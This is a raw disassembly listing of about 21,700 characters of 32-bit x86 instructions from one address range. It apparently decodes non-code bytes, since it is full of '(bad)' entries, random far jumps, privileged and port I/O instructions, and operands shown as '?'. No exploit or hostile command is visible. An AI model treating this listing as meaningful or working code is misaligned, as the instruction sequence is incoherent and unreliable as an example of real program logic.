  49c945:	sbb    BYTE PTR [esi+0x6386c54d],ch
  49c94b:	add    cl,BYTE PTR [edi]
  49c94d:	es push es
  49c94f:	push   es
  49c950:	dec    edi
  49c951:	fcom   DWORD PTR [edi]
  49c953:	daa    
  49c954:	sbb    ch,BYTE PTR [edx-0x2853b858]
  49c95a:	ret    
  49c95b:	inc    edi
  49c95c:	test   eax,0xa241a8a6
  49c961:	mov    bh,0xb
  49c963:	ins    BYTE PTR es:[edi],dx
  49c964:	jmp    0x5a1c:0x5727b719
  49c96b:	pop    ss
  49c96c:	fistp  QWORD PTR [edi-0x76e4bce9]
  49c972:	add    eax,0x7bbb3327
  49c977:	popa   
  49c978:	scas   al,BYTE PTR es:[edi]
  49c979:	dec    edi
  49c97a:	mov    ebp,0xeba36b44
  49c97f:	cmp    BYTE PTR [ebp+0x33],bl
  49c982:	and    eax,0x4193ff2a
  49c987:	pop    ebx
  49c988:	sub    esp,DWORD PTR [ecx]
  49c98a:	ja     0x49c915
  49c98c:	ja     0x49c929
  49c98e:	xlat   BYTE PTR ds:[ebx]
  49c98f:	ret    0x7c0a
  49c992:	pop    es
  49c993:	and    ebp,edi
  49c995:	xor    al,0xa3
  49c997:	and    eax,0x7bbadab4
  49c99c:	inc    edi
  49c99d:	(bad)  
  49c99e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49c99f:	imul   edi,DWORD PTR ds:0xa077ef6b,0xf74b878f
  49c9a9:	jb     0x49c962
  49c9ab:	mov    al,ds:0x9fb5702e
  49c9b0:	cmp    DWORD PTR [edi-0x6a907f28],eax
  49c9b6:	mov    bh,0xeb
  49c9b8:	inc    ebp
  49c9b9:	imul   esp,ebx,0xffffffb4
  49c9bc:	mov    DWORD PTR ds:0x54d23b23,eax
  49c9c2:	inc    esi
  49c9c3:	mov    esp,0xe46fa745
  49c9c8:	jp     0x49c962
  49c9ca:	je     0x49ca46
  49c9cc:	inc    ebx
  49c9cd:	add    edi,DWORD PTR [edi]
  49c9cf:	cmp    al,0xe1
  49c9d1:	fisttp QWORD PTR [ecx+0x2f]
  49c9d4:	xor    DWORD PTR [ebx-0x54e1e665],edx
  49c9da:	or     al,0x83
  49c9dc:	ja     0x49ca4e
  49c9de:	mov    esp,DWORD PTR [eax]
  49c9e0:	jge    0x49c985
  49c9e2:	xchg   DWORD PTR [edx-0x2b],ebx
  49c9e5:	fwait
  49c9e6:	pop    es
  49c9e7:	pop    edx
  49c9e8:	movsx  ecx,WORD PTR [ebx]
  49c9eb:	push   ebp
  49c9ec:	push   ebx
  49c9ed:	inc    ebp
  49c9ee:	push   edx
  49c9ef:	call   0x442e:0x7a295fff
  49c9f6:	dec    esp
  49c9f7:	dec    esp
  49c9f8:	(bad)  
  49c9f9:	adc    BYTE PTR [ecx+0x6c],ah
  49c9fc:	ins    BYTE PTR es:[edi],dx
  49c9fd:	push   edi
  49c9fe:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  49ca05:	outs   dx,DWORD PTR ds:[esi]
  49ca06:	arpl   WORD PTR [ecx+0x578235d2],ax
  49ca0c:	push   edi
  49ca0d:	fwait
  49ca0e:	adc    ax,0x6c04
  49ca12:	mov    eax,0xe0a303c2
  49ca17:	in     eax,dx
  49ca18:	es jno 0x49ca5e
  49ca1b:	neg    DWORD PTR [di]
  49ca1e:	push   esi
  49ca1f:	or     al,0x56
  49ca21:	sub    ebx,DWORD PTR [esi]
  49ca23:	push   ebx
  49ca24:	mov    edx,0xe2d093b1
  49ca29:	out    dx,eax
  49ca2a:	push   cs
  49ca2b:	out    0x7b,eax
  49ca2d:	push   edi
  49ca2e:	inc    edi
  49ca2f:	fwait
  49ca30:	inc    ebx
  49ca31:	aas    
  49ca32:	daa    
  49ca33:	xchg   DWORD PTR [esi+0x75],edx
  49ca36:	pop    ss
  49ca37:	lods   eax,DWORD PTR ds:[esi]
  49ca38:	mov    ds:0x3b45f37b,eax
  49ca3d:	adc    dl,BYTE PTR [edx]
  49ca3f:	xor    DWORD PTR [edi-0x75],esi
  49ca42:	add    bl,BYTE PTR [ebp-0x107351dc]
  49ca48:	add    edi,DWORD PTR [edx+0x3b]
  49ca4b:	dec    ecx
  49ca4c:	and    ah,BYTE PTR [edi+0x2202a5a7]
  49ca52:	scas   al,BYTE PTR es:[edi]
  49ca53:	sti    
  49ca54:	xor    ah,bl
  49ca56:	clc    
  49ca57:	xchg   edx,eax
  49ca58:	jbe    0x49ca1b
  49ca5a:	pop    edi
  49ca5b:	out    dx,eax
  49ca5c:	pop    es
  49ca5d:	retf   0x3684
  49ca60:	in     eax,dx
  49ca61:	aaa    
  49ca62:	cmp    ebx,DWORD PTR [eax]
  49ca64:	lahf   
  49ca65:	nop
  49ca66:	lea    edi,[edi+0x37]
  49ca69:	out    0x45,eax
  49ca6b:	lds    eax,FWORD PTR [edx+0x24]
  49ca6e:	add    ah,bh
  49ca70:	ret    
  49ca71:	push   cs
  49ca72:	loopne 0x49ca7d
  49ca74:	sbb    ebp,DWORD PTR [ebx+edi*1+0x17483807]
  49ca7b:	and    DWORD PTR [edi],ebp
  49ca7d:	repz sbb esi,0x2
  49ca81:	nop
  49ca82:	ret    
  49ca83:	mov    ebx,0x4b80ae6b
  49ca88:	popa   
  49ca89:	dec    edi
  49ca8a:	fwait
  49ca8b:	jne    0x49ca11
  49ca8d:	lea    esi,[eax]
  49ca8f:	sub    ebp,DWORD PTR [edi-0x60]
  49ca92:	adc    DWORD PTR [ecx],0x3e
  49ca95:	jnp    0x49ca69
  49ca97:	not    DWORD PTR [ecx]
  49ca99:	push   ds
  49ca9a:	jmp    0xf4f17651
  49ca9f:	pop    es
  49caa0:	adc    edi,DWORD PTR [esi+0x8000c97]
  49caa6:	pop    edi
  49caa7:	push   edx
  49caa8:	gs imul ebp,DWORD PTR fs:[ebp-0x3e],0xc7cc9611
  49cab1:	dec    eax
  49cab2:	das    
  49cab3:	mov    BYTE PTR [ebx+0x22],0x3c
  49cab7:	fild   DWORD PTR [edi+ecx*8-0x35]
  49cabb:	hlt    
  49cabc:	and    BYTE PTR [ebp+0x5a7f4b51],ah
  49cac2:	popa   
  49cac3:	sub    eax,0x6dbb0386
  49cac8:	mov    eax,0x45fb930a
  49cacd:	mov    bh,0x2c
  49cacf:	cmp    al,al
  49cad1:	sbb    esp,DWORD PTR [esi]
  49cad3:	pop    ss
  49cad4:	dec    edi
  49cad5:	retf   
  49cad6:	xchg   DWORD PTR [eax-0x75],edi
  49cad9:	sub    esp,DWORD PTR [ebx]
  49cadb:	sub    BYTE PTR [edi],0x2f
  49cade:	xchg   ecx,eax
  49cadf:	les    ebx,FWORD PTR [edx-0x1e3845fa]
  49cae5:	mov    esi,0x97f331a9
  49caea:	dec    esi
  49caeb:	add    bl,dh
  49caed:	or     eax,0x82caa7b1
  49caf2:	add    eax,DWORD PTR [ebx+0x3c]
  49caf5:	or     eax,DWORD PTR [edi]
  49caf7:	inc    ebx
  49caf8:	mov    bh,0xf7
  49cafa:	xor    al,0x9c
  49cafc:	clc    
  49cafd:	mov    WORD PTR [edi],?
  49caff:	inc    ebx
  49cb00:	dec    edi
  49cb01:	cmp    edx,edx
  49cb03:	mov    eax,0x17fbdadd
  49cb08:	into   
  49cb09:	sub    al,0x32
  49cb0b:	adc    DWORD PTR [edi+esi*8+0x77],0x44371a30
  49cb13:	or     ebx,0xffffffc1
  49cb16:	fwait
  49cb17:	jl     0x49cb34
  49cb19:	ds jo  0x49cacf
  49cb1c:	inc    edi
  49cb1d:	push   edi
  49cb1e:	fiadd  DWORD PTR ds:0xa4d76f22
  49cb24:	ret    
  49cb25:	dec    esi
  49cb26:	pop    ecx
  49cb27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49cb28:	faddp  st(5),st
  49cb2a:	sbb    eax,0xbf3320ed
  49cb2f:	mov    dh,0x77
  49cb31:	test   eax,0xef69170d
  49cb36:	inc    esi
  49cb37:	dec    ebx
  49cb38:	mov    ecx,DWORD PTR [ebp+ebp*1-0x28]
  49cb3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49cb3d:	ja     0x49cb22
  49cb3f:	fs cli 
  49cb41:	ja     0x49cb92
  49cb43:	scas   eax,DWORD PTR es:[edi]
  49cb44:	mov    edx,0x414256ef
  49cb49:	mov    ss:0x57f12756,eax
  49cb4f:	inc    edi
  49cb50:	inc    esp
  49cb51:	gs jb  0x49cbb9
  49cb54:	cbw    
  49cb56:	xor    DWORD PTR [ebx+ebx*1+0x1a],esi
  49cb5a:	jmp    0xe84b638e
  49cb5f:	jecxz  0x49caf7
  49cb61:	mov    esi,0xeb23b771
  49cb66:	pusha  
  49cb67:	pop    es
  49cb68:	pop    eax
  49cb69:	mov    al,0x30
  49cb6b:	pop    es
  49cb6c:	mov    ds:0x1cf2171f,eax
  49cb71:	in     al,dx
  49cb72:	xor    ebx,DWORD PTR [edi+0x37]
  49cb75:	xor    dh,BYTE PTR ds:0x215ba4b7
  49cb7b:	aas    
  49cb7c:	xor    eax,DWORD PTR [edx]
  49cb7e:	fisub  DWORD PTR [edx+0x321f68e0]
  49cb84:	pop    ds
  49cb85:	jmp    DWORD PTR [eax-0x17]
  49cb88:	push   ss
  49cb89:	sbb    esi,DWORD PTR [edi+ebx*8]
  49cb8c:	pop    ds
  49cb8d:	ss push esi
  49cb8f:	inc    ecx
  49cb90:	xchg   edx,eax
  49cb91:	dec    edi
  49cb92:	fsubp  st(4),st
  49cb94:	bswap  esi
  49cb96:	adc    DWORD PTR [eax-0x30],0x7
  49cb9a:	out    0xf0,eax
  49cb9c:	adc    edx,DWORD PTR [eax]
  49cb9e:	test   al,0x8
  49cba0:	mov    eax,DWORD PTR [edi]
  49cba2:	mov    eax,ds:0x6b6a6858
  49cba7:	pop    ebx
  49cba8:	lea    edx,[esi+0x5b]
  49cbab:	mov    al,ds:0xb767f736
  49cbb0:	hlt    
  49cbb1:	leave  
  49cbb2:	jno    0x49cb70
  49cbb4:	and    eax,0x6d339773
  49cbb9:	dec    ebp
  49cbba:	les    ebx,FWORD PTR [ebx+0x47]
  49cbbd:	jecxz  0x49cbce
  49cbbf:	sti    
  49cbc0:	dec    edx
  49cbc1:	xchg   edi,eax
  49cbc2:	je     0x49cbfc
  49cbc4:	jae    0x49cbe1
  49cbc6:	pop    edi
  49cbc7:	dec    edi
  49cbc8:	and    al,0x82
  49cbca:	inc    ecx
  49cbcb:	cmp    ecx,DWORD PTR [edi-0x7d6fe1f6]
  49cbd1:	movsx  ecx,WORD PTR [edi]
  49cbd4:	das    
  49cbd5:	add    eax,0xcbcf0589
  49cbda:	ja     0x49cc23
  49cbdc:	or     eax,0x338f6b90
  49cbe1:	daa    
  49cbe2:	mov    ch,0x8d
  49cbe4:	(bad)  
  49cbe5:	cmp    bh,0xd3
  49cbe8:	(bad)  
  49cbe9:	ins    BYTE PTR es:[edi],dx
  49cbea:	jb     0x49cbfd
  49cbec:	mov    esp,0xf7333f87
  49cbf1:	sbb    BYTE PTR [esi+0x3fd2b822],dh
  49cbf7:	outs   dx,DWORD PTR ds:[esi]
  49cbf8:	xor    bl,BYTE PTR [eax-0x4f]
  49cbfb:	mov    cl,0x91
  49cbfd:	add    ebp,DWORD PTR [ebx]
  49cbff:	jbe    0x49cbb1
  49cc01:	mov    ss:0xbf6fbf8b,al
  49cc07:	lods   eax,DWORD PTR ds:[esi]
  49cc08:	pop    ebp
  49cc09:	ins    BYTE PTR es:[edi],dx
  49cc0a:	add    dh,BYTE PTR [esi]
  49cc0c:	pop    ds
  49cc0d:	xor    al,0x8f
  49cc0f:	fiadd  DWORD PTR [edx+0x7707b0d5]
  49cc15:	mul    DWORD PTR [ebx-0x48e2e4b6]
  49cc1b:	push   cs
  49cc1c:	outs   dx,DWORD PTR ds:[esi]
  49cc1d:	mov    ds:0x7055618,eax
  49cc22:	xchg   edi,eax
  49cc23:	xor    eax,DWORD PTR [ebx-0x46f4a71f]
  49cc29:	xor    BYTE PTR [edi+0x79],ah
  49cc2c:	cs fs stos BYTE PTR es:[edi],al
  49cc2f:	xor    DWORD PTR [ebx],0x33
  49cc32:	cmp    BYTE PTR [ebx+eax*1],al
  49cc35:	fisubr WORD PTR [edx]
  49cc37:	jg     0x49cc9c
  49cc39:	mov    ss,WORD PTR ds:0x73f782c1
  49cc3f:	xchg   DWORD PTR [ebx+0x4d],edx
  49cc42:	fwait
  49cc43:	xchg   ecx,eax
  49cc44:	add    esp,DWORD PTR [edi]
  49cc46:	xor    BYTE PTR [esp+ecx*2],bh
  49cc49:	mov    edx,0x37472f1d
  49cc4e:	add    edi,0x4b
  49cc51:	sbb    edx,DWORD PTR [edi+eiz*8-0x11]
  49cc55:	test   edi,0x5c9460a5
  49cc5b:	xor    al,0x3f
  49cc5d:	hlt    
  49cc5e:	xor    DWORD PTR [edi-0x14189053],0x441d5197
  49cc68:	push   edi
  49cc69:	lahf   
  49cc6a:	xor    bh,ah
  49cc6c:	cmp    DWORD PTR [ebx],eax
  49cc6e:	dec    esp
  49cc6f:	mov    al,0x83
  49cc71:	sbb    bh,al
  49cc73:	jmp    0x49cca7
  49cc75:	adc    al,0x1d
  49cc77:	imul   eax,DWORD PTR [ebp-0x12a81c31],0x2a
  49cc7e:	sub    eax,0x308fd38f
  49cc83:	jbe    0x49cc0e
  49cc85:	pusha  
  49cc86:	and    al,0x1f
  49cc88:	inc    esi
  49cc89:	(bad)  
  49cc8a:	sbb    esi,DWORD PTR [eax+0x773908e0]
  49cc90:	addps  xmm7,XMMWORD PTR [esi]
  49cc93:	mov    cl,0xa
  49cc95:	and    eax,DWORD PTR [esi-0x8]
  49cc98:	adc    ah,0xb0
  49cc9b:	jmp    0xd561:0x9b5c23f3
  49cca2:	aaa    
  49cca3:	repz xor DWORD PTR [edi-0x36f965cf],ecx
  49ccaa:	xchg   ecx,eax
  49ccab:	xor    esi,ebx
  49ccad:	pop    esp
  49ccae:	ins    BYTE PTR es:[edi],dx
  49ccaf:	dec    ebx
  49ccb0:	adc    BYTE PTR [ebx-0x3ecee091],al
  49ccb6:	inc    ebp
  49ccb7:	(bad)  
  49ccb8:	adc    eax,0x379f34c3
  49ccbd:	call   FWORD PTR [esi-0x7f]
  49ccc0:	loopne 0x49cd1a
  49ccc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49ccc3:	sub    ebp,DWORD PTR [ebp+esi*1-0x54]
  49ccc7:	xchg   edx,eax
  49ccc8:	xor    al,0x17
  49ccca:	daa    
  49cccb:	inc    ebx
  49cccc:	fisttp DWORD PTR [eax]
  49ccce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49cccf:	mov    bh,0x1f
  49ccd1:	sub    al,0xd0
  49ccd3:	xor    DWORD PTR ds:0xaa878f73,0x3332c54d
  49ccdd:	push   DWORD PTR ds:0x830f44e3
  49cce3:	jecxz  0x49cd18
  49cce5:	dec    ebx
  49cce6:	ret    
  49cce7:	iret   
  49cce8:	lods   al,BYTE PTR ds:[esi]
  49cce9:	and    dl,bl
  49cceb:	push   esi
  49ccec:	aas    
  49cced:	aas    
  49ccee:	ret    0x1920
  49ccf1:	add    bl,BYTE PTR [edi-0x47574fca]
  49ccf7:	int    0x8f
  49ccf9:	push   cs
  49ccfa:	fist   DWORD PTR [esi]
  49ccfc:	rcl    DWORD PTR [esi+0x1f0fff08],0xdb
  49cd03:	pop    ebx
  49cd04:	adc    eax,0x7dfff0b
  49cd09:	mov    bl,0x23
  49cd0b:	push   ebp
  49cd0c:	mov    WORD PTR [edx+0xadfb335],gs
  49cd12:	inc    edx
  49cd13:	jo     0x49ccf5
  49cd15:	pop    ds
  49cd16:	or     ebp,DWORD PTR [ebx]
  49cd18:	es loopne 0x49cd15
  49cd1b:	inc    esp
  49cd1c:	iret   
  49cd1d:	stos   DWORD PTR es:[edi],eax
  49cd1e:	cmp    edx,ebx
  49cd20:	mov    ecx,0x8b270510
  49cd25:	xchg   esi,eax
  49cd26:	(bad)  
  49cd27:	dec    esp
  49cd28:	xor    DWORD PTR [esi-0x54],esi
  49cd2b:	mov    edi,0x5868fcb7
  49cd30:	xor    cl,ah
  49cd32:	xchg   DWORD PTR [ebx],esi
  49cd34:	repz fisubr DWORD PTR es:[eax-0x68]
  49cd39:	xor    dl,bl
  49cd3b:	pop    ds
  49cd3c:	xor    al,0xaa
  49cd3e:	push   edx
  49cd3f:	pop    ebx
  49cd40:	les    ebx,FWORD PTR [edi+0x1f]
  49cd43:	iret   
  49cd44:	pop    edx
  49cd45:	add    DWORD PTR [ebp+0x21],esi
  49cd48:	cmp    eax,DWORD PTR es:[ebp+0x6b]
  49cd4c:	js     0x49cd39
  49cd4e:	xchg   edi,eax
  49cd4f:	inc    edi
  49cd50:	pop    es
  49cd51:	add    ebx,esi
  49cd53:	test   al,0xe
  49cd55:	mov    cl,BYTE PTR [edi+0x21f71f37]
  49cd5b:	adc    eax,ebp
  49cd5d:	call   0x6094:0x253587d7
  49cd64:	pop    edx
  49cd65:	inc    ebx
  49cd66:	add    edx,DWORD PTR [ecx+0x1360751c]
  49cd6c:	xor    DWORD PTR [ecx],edi
  49cd6e:	sub    cl,0x28
  49cd71:	mov    ebx,0xd23e34d3
  49cd76:	adc    al,0xda
  49cd78:	inc    edi
  49cd79:	sysret 
  49cd7b:	aam    0x88
  49cd7d:	sub    ebx,DWORD PTR [eax]
  49cd7f:	xlat   BYTE PTR ds:[ebx]
  49cd80:	xor    BYTE PTR [ebx],bl
  49cd82:	lea    edx,[ebx]
  49cd84:	mov    DWORD PTR [esi+0x5d305f17],eax
  49cd8a:	sbb    edx,DWORD PTR [esi]
  49cd8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49cd8d:	lahf   
  49cd8e:	fwait
  49cd8f:	xor    eax,0xd5bc3157
  49cd94:	(bad)  
  49cd95:	aas    
  49cd96:	(bad)  
  49cd97:	sub    BYTE PTR ss:[ecx-0x78],al
  49cd9b:	or     ebx,ebx
  49cd9d:	mov    edi,0x7c1635d3
  49cda2:	idiv   edi
  49cda4:	dec    ebx
  49cda5:	jmp    0x49cd27
  49cda7:	mov    bh,0x86
  49cda9:	inc    ebp
  49cdaa:	repz sbb DWORD PTR [eax],0xffffffdc
  49cdae:	dec    eax
  49cdaf:	inc    esp
  49cdb0:	(bad)  
  49cdb1:	test   DWORD PTR [ebp-0x55],0x73d7056b
  49cdb8:	repz xor DWORD PTR [ebp+edx*1+0x2f03374d],esi
  49cdc0:	aaa    
  49cdc1:	push   ebx
  49cdc2:	and    bl,BYTE PTR [eax]
  49cdc4:	inc    esp
  49cdc5:	jnp    0x49ce06
  49cdc7:	pop    es
  49cdc8:	or     BYTE PTR [ecx+edx*8-0x5c],0x80
  49cdcd:	aas    
  49cdce:	xor    al,0x29
  49cdd0:	mov    dl,BYTE PTR [ebp+0x18]
  49cdd3:	mov    edi,0xab720f07
  49cdd8:	mov    ds:0xff6f3f33,al
  49cddd:	jb     0x49ce00
  49cddf:	pop    ss
  49cde0:	pushf  
  49cde1:	cld    
  49cde2:	(bad)  
  49cde3:	xor    BYTE PTR ss:[edx+0x29],bh
  49cde7:	mov    ds:0x13272311,al
  49cdec:	shl    BYTE PTR ds:0x7373232a,cl
  49cdf2:	push   ebx
  49cdf3:	add    eax,0x3e035b2e
  49cdf8:	jecxz  0x49ce2d
  49cdfa:	outs   dx,BYTE PTR ds:[esi]
  49cdfb:	pop    ebx
  49cdfc:	test   al,0x12
  49cdfe:	pop    DWORD PTR [edi+0xb]
  49ce01:	xor    BYTE PTR [ebp+eax*8-0x56],bl
  49ce05:	pop    eax
  49ce06:	pop    ss
  49ce07:	jg     0x49ce3e
  49ce09:	inc    edx
  49ce0a:	fadd   QWORD PTR [ebp+esi*1+0x3b391707]
  49ce11:	add    eax,0x31640298
  49ce16:	xor    ah,BYTE PTR [ebx+0x72]
  49ce19:	add    eax,0x630e01b8
  49ce1e:	xor    DWORD PTR [eax],edi
  49ce20:	mov    dh,0x86
  49ce22:	push   ebp
  49ce23:	pop    es
  49ce24:	iret   
  49ce25:	and    DWORD PTR ss:[ebp-0x20],edx
  49ce29:	(bad)  
  49ce2a:	(bad)  
  49ce2b:	xor    DWORD PTR [ebx-0x7a],ebp
  49ce2e:	push   ebx
  49ce2f:	sbb    dh,BYTE PTR [eax+0xf8ec307]
  49ce35:	pop    edi
  49ce36:	dec    eax
  49ce37:	pop    esp
  49ce38:	cmp    DWORD PTR [ebx],0x46
  49ce3b:	xor    ch,BYTE PTR [eax+0x10]
  49ce3e:	dec    ebp
  49ce3f:	and    eax,0x2814e333
  49ce44:	les    edx,FWORD PTR [esi+0x1f]
  49ce47:	iret   
  49ce48:	xchg   ebx,eax
  49ce49:	mov    BYTE PTR [ecx+esi*2+0x69],bl
  49ce4d:	push   DWORD PTR [eax]
  49ce4f:	or     dl,BYTE PTR [edx]
  49ce51:	test   DWORD PTR [eax-0x21],edi
  49ce54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49ce55:	pop    ds
  49ce56:	in     al,dx
  49ce57:	sbb    ebp,DWORD PTR [ebx-0x66]
  49ce5a:	xor    al,0x17
  49ce5c:	arpl   bx,bp
  49ce5e:	push   0x3342bac6
  49ce63:	iret   
  49ce64:	inc    ecx
  49ce65:	adc    al,0xb
  49ce67:	adc    BYTE PTR [ebx-0x38db7185],ah
  49ce6d:	mov    DWORD PTR [edi+0x554dc332],esi
  49ce73:	bound  eax,QWORD PTR [ebp-0x55]
  49ce76:	arpl   WORD PTR [eax],si
  49ce78:	popa   
  49ce79:	ror    BYTE PTR [ebp-0x266064cf],1
  49ce7f:	cli    
  49ce80:	mov    dl,0x15
  49ce82:	aaa    
  49ce83:	inc    DWORD PTR [ecx]
  49ce85:	add    DWORD PTR [esi-0x4f],edx
  49ce88:	call   0x144a:0x7f131fb0
  49ce8f:	sub    eax,0xaf3383f9
  49ce94:	fcomp  QWORD PTR [eax-0x23]
  49ce97:	js     0x49cf08
  49ce99:	and    DWORD PTR [ebx+0x28],0xffffffa8
  49ce9d:	mov    esi,0x6d1f4f52
  49cea2:	pop    eax
  49cea3:	adc    al,0xdc
  49cea5:	push   esi
  49cea6:	outs   dx,DWORD PTR ds:[esi]
  49cea7:	(bad)  
  49cea9:	sbb    BYTE PTR [esi],al
  49ceab:	je     0x49ce68
  49cead:	push   ebx
  49ceae:	aaa    
  49ceaf:	jecxz  0x49ceba
  49ceb1:	or     edi,DWORD PTR [eax]
  49ceb3:	pop    ss
  49ceb4:	add    eax,DWORD PTR [ebx-0x108ee773]
  49ceba:	aas    
  49cebb:	ret    
  49cebc:	dec    ebp
  49cebd:	pop    es
  49cebe:	sub    ecx,DWORD PTR [edx-0x248c1449]
  49cec4:	stos   BYTE PTR es:[edi],al
  49cec5:	fcom   DWORD PTR [esi]
  49cec7:	add    eax,ebx
  49cec9:	inc    edi
  49ceca:	je     0x49cee1
  49cecc:	push   0xc
  49cece:	movlps QWORD PTR [ecx],xmm6
  49ced1:	and    bl,BYTE PTR [ecx+ebp*4+0x73305b18]
  49ced8:	lods   al,BYTE PTR ds:[esi]
  49ced9:	pusha  
  49ceda:	pop    es
  49cedb:	sub    DWORD PTR [ebx-0x41],esp
  49cede:	lds    esi,FWORD PTR [eax+0x1b8b1d0a]
  49cee4:	sub    eax,DWORD PTR [edi+0x6d]
  49cee7:	push   0xffffffc2
  49cee9:	xor    al,0xc3
  49ceeb:	xor    al,0xbf
  49ceed:	xor    al,0xa5
  49ceef:	xor    DWORD PTR [esp+ecx*1+0x2b],ebx
  49cef3:	xor    al,0xf
  49cef5:	ret    0x60aa
  49cef8:	inc    esp
  49cef9:	pop    ds
  49cefa:	pop    ebx
  49cefb:	mov    edx,0x8be216c2
  49cf00:	ja     0x49cf05
  49cf02:	mov    ecx,0x4b6ab9e4
  49cf07:	xor    BYTE PTR [eax],dh
  49cf09:	xor    bh,BYTE PTR [edx-0x1cd4f656]
  49cf0f:	xor    eax,0x62e1f3a6
  49cf14:	dec    ebx
  49cf15:	xor    cl,BYTE PTR [edi]
  49cf17:	add    al,0x27
  49cf19:	loope  0x49cf48
  49cf1b:	xor    BYTE PTR fs:[ebx],0x27
  49cf1f:	push   ecx
  49cf20:	add    BYTE PTR [ebx],dl
  49cf22:	adc    eax,0x8a1731bb
  49cf27:	or     eax,0x334e4b
  49cf2c:	(bad)  
  49cf2d:	pop    edi
  49cf2e:	in     eax,dx
  49cf2f:	and    ch,al
  49cf31:	or     bh,BYTE PTR [edi+0x16d55fa7]
  49cf37:	in     al,dx
  49cf38:	pop    eax
  49cf39:	daa    
  49cf3a:	jecxz  0x49cf43
  49cf3c:	add    bl,BYTE PTR [eax+0x2e]
  49cf3f:	xor    bl,0x32
  49cf42:	cmp    ebp,DWORD PTR [edx-0x5cf4552a]
  49cf48:	xor    BYTE PTR [edi],bl
  49cf4a:	mov    ds:0x5f5a6ad2,al
  49cf4f:	daa    
  49cf50:	lods   al,BYTE PTR ds:[esi]
  49cf51:	cmp    dh,dl
  49cf53:	xchg   esp,eax
  49cf54:	(bad)  
  49cf55:	push   ebx
  49cf56:	loopne 0x49cf7a
  49cf58:	xlat   BYTE PTR ds:[ebx]
  49cf59:	add    al,0x43
  49cf5b:	aaa    
  49cf5c:	(bad)  
  49cf5e:	loopne 0x49cf36
  49cf60:	jno    0x49cf11
  49cf62:	cmp    eax,DWORD PTR [ebx]
  49cf64:	cmpxchg BYTE PTR [eax],ch
  49cf67:	pop    edx
  49cf68:	push   ebp
  49cf69:	inc    ebx
  49cf6a:	sub    edi,DWORD PTR [ecx-0x5f]
  49cf6d:	sub    al,0xc1
  49cf6f:	aaa    
  49cf70:	jmp    0x49cfbd
  49cf72:	xor    BYTE PTR [ebp+0x6b221155],ch
  49cf78:	pusha  
  49cf79:	mov    ds:0x335f440a,al
  49cf7e:	xor    al,0xbf
  49cf80:	push   ebx
  49cf81:	dec    eax
  49cf82:	push   esp
  49cf83:	sar    DWORD PTR [edi],cl
  49cf85:	je     0x49cfff
  49cf87:	je     0x49cfee
  49cf89:	cmp    al,0x3b
  49cf8b:	sti    
  49cf8c:	std    
  49cf8d:	jno    0x49d004
  49cf8f:	imul   esi,DWORD PTR [eax+0x6e],0x6c73176f
  49cf96:	daa    
  49cf97:	jb     0x49cffe
  49cf99:	vmwrite ebp,DWORD PTR [edi+0x6d]
  49cf9d:	or     al,0x83
  49cf9f:	jb     0x49cfc2
  49cfa1:	ds mov al,0x6f
  49cfa4:	xor    bh,BYTE PTR [eax]
  49cfa6:	xor    BYTE PTR [ecx+0x8],al
  49cfa9:	sti    
  49cfaa:	xor    BYTE PTR [ebx+0x56],cl
  49cfad:	mov    al,ds:0x1f23014d
  49cfb2:	mov    al,0x4b
  49cfb4:	lods   al,BYTE PTR ds:[esi]
  49cfb5:	sbb    BYTE PTR [edi+0x5812bf37],dh
  49cfbb:	add    al,0x13
  49cfbd:	xor    DWORD PTR [edi],esp
  49cfbf:	shr    BYTE PTR [edx-0x3e],1
  49cfc2:	mov    cl,BYTE PTR [edi+0x4288c04b]
  49cfc8:	and    esp,edi
  49cfca:	lahf   
  49cfcb:	jmp    0x3a43:0xd70bbff6
  49cfd2:	pop    esp
  49cfd3:	push   ebp
  49cfd4:	jae    0x49d03b
  49cfd6:	jb     0x49d04b
  49cfd8:	or     al,BYTE PTR [esi+0x4f]
  49cfdb:	pop    esp
  49cfdc:	std    
  49cfdd:	(bad)  
  49cfde:	jmp    DWORD PTR [edx+0x20]
  49cfe1:	imul   esi,DWORD PTR [edi+ebp*2+0x70],0x5c
  49cfe6:	inc    ebx
  49cfe7:	outs   dx,DWORD PTR ds:[esi]
  49cfe8:	ins    BYTE PTR es:[edi],dx
  49cfe9:	fs and al,0x65
  49cfec:	popa   
  49cfed:	ins    BYTE PTR es:[edi],dx
  49cfee:	pop    edi
  49cfef:	ss xor DWORD PTR cs:[edi+0x70],ebx
  49cff4:	jb     0x49d05f
  49cff6:	jbe    0x49cfb3
  49cff8:	test   edi,ecx
  49cffa:	ins    DWORD PTR es:[edi],dx
  49cffb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49cffc:	sub    BYTE PTR [ebp+0x70],ch
  49cfff:	mov    ?,WORD PTR [edx+0x5c]
  49d002:	jl     0x49d01b
  49d004:	or     bl,bl
  49d006:	push   esi
  49d007:	inc    edx
  49d008:	sub    al,0x4f
  49d00a:	dec    esp
  49d00b:	dec    esp
  49d00c:	les    ebp,FWORD PTR [ebx+0x47]
  49d00f:	xchg   DWORD PTR [esi],eax
  49d011:	inc    edx
  49d012:	fcmovne st,st(6)
  49d014:	sub    eax,0x1e6998ff
  49d019:	aam    0x79
  49d01b:	push   es
  49d01c:	xchg   esp,eax
  49d01d:	adc    eax,0x2fc53fff
  49d022:	and    BYTE PTR ds:0x4ed2002e,ah
  49d028:	lods   eax,DWORD PTR ds:[esi]
  49d029:	xor    ebx,DWORD PTR [ecx-0x48ee309a]
  49d02f:	add    BYTE PTR [edx-0x75449e],ch
  49d035:	add    BYTE PTR [eax-0x2d],ah
  49d038:	xchg   ebx,eax
  49d039:	push   eax
  49d03a:	imul   esp,DWORD PTR [ebx+0x74],0x3f313275
  49d041:	or     cl,BYTE PTR [edi+0x37]
  49d044:	clc    
  49d045:	or     edi,ecx
  49d047:	jle    0x49d0ac
  49d049:	bound  ebp,QWORD PTR [edi+0x68]
  49d04c:	fs cs repz dec esi
  49d050:	ins    DWORD PTR es:[edi],dx
  49d051:	bound  esi,QWORD PTR fs:[ebp+0x74]
  49d055:	mov    dl,BYTE PTR ds:0x6e382bb7
  49d05b:	ss jg  0x49d091
  49d05e:	out    dx,eax
